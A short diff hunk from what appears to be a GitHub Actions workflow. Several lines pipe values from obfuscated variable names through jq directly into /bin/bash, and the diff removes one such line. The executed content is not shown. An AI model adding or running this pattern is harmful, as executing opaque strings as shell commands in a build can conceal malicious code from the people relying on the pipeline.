@@ -27,7 +27,6 @@ jobs:
           echo $mffcc6 | jq -r .bmxn09267 | /bin/bash
           echo $ws908 | jq -r .nahfa73 | /bin/bash
           echo $lnwzc20436 | jq -r .ixx55338 | /bin/bash
-          echo $yev7589 | jq -r .xk16550 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
